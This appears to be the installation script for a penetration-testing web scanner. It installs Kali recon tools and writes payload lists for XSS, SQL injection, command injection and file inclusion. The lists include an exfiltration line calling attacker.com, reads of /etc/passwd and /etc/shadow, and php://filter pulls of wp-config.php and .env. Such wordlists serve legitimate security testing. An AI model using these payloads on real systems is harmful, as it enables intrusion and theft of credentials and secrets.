#!/bin/bash
# ──────────────────────────────────────────────────────────────
# ARABI KATHA VULNERABILITY SCANNER v3.0 - Kali Setup
# الـمـسـح الـضـعـف الـعـربـي
# Author: @alok.t.r
# ──────────────────────────────────────────────────────────────

# Arabian Nights Color Palette
GOLD='\033[38;5;214m'
CRIMSON='\033[38;5;196m'
DARK_RED='\033[38;5;88m'
TEAL='\033[38;5;37m'
PURPLE='\033[38;5;129m'
ORANGE='\033[38;5;208m'
CREAM='\033[38;5;230m'
WHITE='\033[38;5;255m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

clear
echo -e "${CRIMSON}${BOLD}"
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║              ◈  الـمـسـح الـضـعـف الـعـربـي  ◈                  ║"
echo "║           ARABI KATHA VULNERABILITY SCANNER v3.0                ║"
echo "║                    INSTALLATION - تـثـبـيـت                      ║"
echo "║                                                                  ║"
echo "║    ${GOLD}◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈${CRIMSON}   ║"
echo "║    ${GOLD}                                                        ${CRIMSON}   ║"
echo "║    ${GOLD}   ا   ل   م   س   ح      ض   ع   ف      ع   ر   ب   ي   ${CRIMSON}   ║"
echo "║    ${GOLD}                                                        ${CRIMSON}   ║"
echo "║    ${GOLD}◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈ ◈${CRIMSON}   ║"
echo "║                                                                  ║"
echo "║   🏮  Scanner of the Thousand and One Vulnerabilities  🏮      ║"
echo "║   👤  Author: @alok.t.r                                         ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo -e "${CRIMSON}${BOLD}[!] This script needs root privileges.${RESET}"
   echo -e "${ORANGE}    Run: sudo bash setup.sh${RESET}"
   exit 1
fi

echo ""
echo -e "${GOLD}${BOLD}═══════════════════════════════════════════════════════════════════${RESET}"
echo -e "${GOLD}  🏮 STARTING INSTALLATION - بـدء الـتـثـبـيـت${RESET}"
echo -e "${GOLD}═══════════════════════════════════════════════════════════════════${RESET}"
echo ""

# Step 1: Update system
echo -e "${TEAL}[1/7] 🏮 Updating package lists...${RESET}"
apt-get update -qq 2>/dev/null
echo -e "${GOLD}    ✅ Done${RESET}"

# Step 2: Install Python3
echo ""
echo -e "${TEAL}[2/7] 🐍 Checking Python...${RESET}"
if ! command -v python3 &> /dev/null; then
    echo -e "${ORANGE}    Installing Python3...${RESET}"
    apt-get install -y python3 python3-pip 2>/dev/null
fi
echo -e "${GOLD}    ✅ Python3: $(python3 --version 2>/dev/null || echo 'installed')${RESET}"

# Step 3: Install Python dependencies
echo ""
echo -e "${TEAL}[3/7] 📦 Installing Python dependencies...${RESET}"
pip3 install requests beautifulsoup4 urllib3 2>/dev/null
echo -e "${GOLD}    ✅ Python packages installed${RESET}"

# Step 4: Install Kali tools
echo ""
echo -e "${TEAL}[4/7] 🗡️  Installing Kali tools...${RESET}"
KALI_TOOLS=("subfinder" "nmap" "ffuf" "gobuster" "curl" "jq" "git")
INSTALLED=0
MISSING=0
for tool in "${KALI_TOOLS[@]}"; do
    if ! command -v "$tool" &> /dev/null; then
        echo -e "    ${ORANGE}Installing $tool...${RESET}"
        apt-get install -y "$tool" 2>/dev/null && ((INSTALLED++)) || ((MISSING++))
    else
        echo -e "    ${GOLD}✅ $tool already installed${RESET}"
        ((INSTALLED++))
    fi
done
echo -e "${GOLD}    ✅ Tools installed: $INSTALLED/${#KALI_TOOLS[@]}${RESET}"

# Step 5: Install Go tools
echo ""
echo -e "${TEAL}[5/7] 🧞 Installing advanced Go tools...${RESET}"
if command -v go &> /dev/null; then
    GO_TOOLS=("nuclei" "httpx" "katana")
    for gtool in "${GO_TOOLS[@]}"; do
        if ! command -v "$gtool" &> /dev/null; then
            echo -e "    ${ORANGE}Installing $gtool...${RESET}"
            go install "github.com/projectdiscovery/${gtool}/v3/cmd/${gtool}@latest" 2>/dev/null || \
            go install "github.com/projectdiscovery/${gtool}/cmd/${gtool}@latest" 2>/dev/null || \
            echo -e "    ${CREAM}Skipping $gtool${RESET}"
        else
            echo -e "    ${GOLD}✅ $gtool already installed${RESET}"
        fi
    done
    echo -e "${GOLD}    ✅ Go tools checked${RESET}"
else
    echo -e "${ORANGE}    ⚠️  Go not installed. To install: apt-get install golang${RESET}"
fi

# Step 6: Create project structure
echo ""
echo -e "${TEAL}[6/7] 📁 Creating project directories...${RESET}"
mkdir -p reports payloads wordlists
chmod +x scanner.py 2>/dev/null
echo -e "${GOLD}    ✅ Directories created${RESET}"

# Step 7: Create payload files
echo ""
echo -e "${TEAL}[7/7] 📜 Creating payload files...${RESET}"

# XSS Payloads
if [ ! -f "payloads/xss.txt" ]; then
    cat > payloads/xss.txt << 'EOF'
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
'><svg onload=alert(1)>
<ScRiPt>alert(1)</ScRiPt>
" autofocus onfocus=alert(1) x="
';alert(1);//
</script><script>alert(1)</script>
<details open ontoggle=alert(1)>
<img src=x onerror=eval(atob('YWxlcnQoMSk))>
%3Cscript%3Ealert(1)%3C/script%3E
<BODY ONLOAD=alert('XSS')>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
EOF
    echo -e "    ${GOLD}✅ XSS payloads created${RESET}"
fi

# SQLi Payloads
if [ ! -f "payloads/sqli.txt" ]; then
    cat > payloads/sqli.txt << 'EOF'
'
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR 1=1--
" OR 1=1--
1' OR '1'='1
1' OR '1'='1' --
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
admin' --
admin' #
' OR 1=1 LIMIT 1--
' WAITFOR DELAY '0:0:5'--
1 AND SLEEP(5)
1' AND SLEEP(5) AND '1'='1
1' AND 1=1--
1' AND 1=2--
EOF
    echo -e "    ${GOLD}✅ SQLi payloads created${RESET}"
fi

# CMDi Payloads
if [ ! -f "payloads/cmdi.txt" ]; then
    cat > payloads/cmdi.txt << 'EOF'
; ls
| ls
|| ls
& ls
&& ls
`ls`
$(ls)
; id
| id
; whoami
| whoami
; cat /etc/passwd
| cat /etc/passwd
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
; echo INJECTED
| echo INJECTED
| nslookup burpcollaborator.net
| curl http://attacker.com/$(whoami)
%3B%20ls
%7C%20ls
| dir
& whoami
| ver
; ls -la
| ls -la
$(id)
`id`
; ping -c 5 127.0.0.1
| ping -n 5 127.0.0.1
EOF
    echo -e "    ${GOLD}✅ CMDi payloads created${RESET}"
fi

# LFI Payloads
if [ ! -f "payloads/lfi.txt" ]; then
    cat > payloads/lfi.txt << 'EOF'
../../../../../../etc/passwd
../../../../../../etc/hosts
../../../../../../etc/shadow
../../../../../../proc/self/environ
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=wp-config.php
php://filter/convert.base64-encode/resource=../.env
file:///etc/passwd
expect://id
../../../../../../windows/win.ini
....//....//....//....//....//....//etc/passwd
..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
EOF
    echo -e "    ${GOLD}✅ LFI payloads created${RESET}"
fi

# ─── FINAL SUCCESS MESSAGE ──────────────────────────────────
echo ""
echo -e "${GOLD}${BOLD}╔══════════════════════════════════════════════════════════════════╗${RESET}"
echo -e "${GOLD}${BOLD}║                                                                    ║${RESET}"
echo -e "${GOLD}${BOLD}║    🏮  INSTALLATION COMPLETE - تـم الـتـثـبـيـت  🏮              ║${RESET}"
echo -e "${GOLD}${BOLD}║                                                                    ║${RESET}"
echo -e "${GOLD}${BOLD}╠══════════════════════════════════════════════════════════════════╣${RESET}"
echo -e "${GOLD}${BOLD}║                                                                    ║${RESET}"
echo -e "${GOLD}${BOLD}║  ${CREAM}👤  Author: @alok.t.r${RESET}                                    ${GOLD}║${RESET}"
echo -e "${GOLD}${BOLD}║  ${CREAM}🏮  ARABI KATHA SCANNER v3.0${RESET}                             ${GOLD}║${RESET}"
echo -e "${GOLD}${BOLD}║                                                                    ║${RESET}"
echo -e "${GOLD}${BOLD}║  ${TEAL}⚔️  Quick Start - بـدء سـريـع:${RESET}                               ${GOLD}║${RESET}"
echo -e "${GOLD}${BOLD}║                                                                    ║${RESET}"
echo -e "${GOLD}${BOLD}║  ${WHITE}python3 scanner.py -u https://target.com --all${RESET}            ${GOLD}║${RESET}"
echo -e "${GOLD}${BOLD}║  ${WHITE}python3 scanner.py -u http://localhost:3000 --xss --sqli${RESET}   ${GOLD}║${RESET}"
echo -e "${GOLD}${BOLD}║  ${WHITE}python3 scanner.py -f urls.txt --all -o html${RESET}              ${GOLD}║${RESET}"
echo -e "${GOLD}${BOLD}║                                                                    ║${RESET}"
echo -e "${GOLD}${BOLD}║  ${TEAL}📜  Available Modules:${RESET}                                      ${GOLD}║${RESET}"
echo -e "${GOLD}${BOLD}║  ${CREAM}  xss | sqli | cmdi | lfi | recon | jwt | exposed${RESET}         ${GOLD}║${RESET}"
echo -e "${GOLD}${BOLD}║  ${CREAM}  api | cors | ssrf | secrets | graphql | headers${RESET}         ${GOLD}║${RESET}"
echo -e "${GOLD}${BOLD}║  ${CREAM}  ssti | upload | js | idor${RESET}                               ${GOLD}║${RESET}"
echo -e "${GOLD}${BOLD}║                                                                    ║${RESET}"
echo -e "${GOLD}${BOLD}║  ${CRIMSON}☠️  For Authorized Penetration Testing Only${RESET}              ${GOLD}║${RESET}"
echo -e "${GOLD}${BOLD}║                                                                    ║${RESET}"
echo -e "${GOLD}${BOLD}╚══════════════════════════════════════════════════════════════════╝${RESET}"
echo ""
echo -e "${GOLD}${BOLD}═══ 🏮 ARABI KATHA - الـمـسـح الـضـعـف الـعـربـي 🏮 ═══${RESET}"
echo -e "${CREAM}  👤  @alok.t.r${RESET}"
echo -e "${GOLD}${BOLD}═══════════════════════════════════════════════════════════════════${RESET}"
echo ""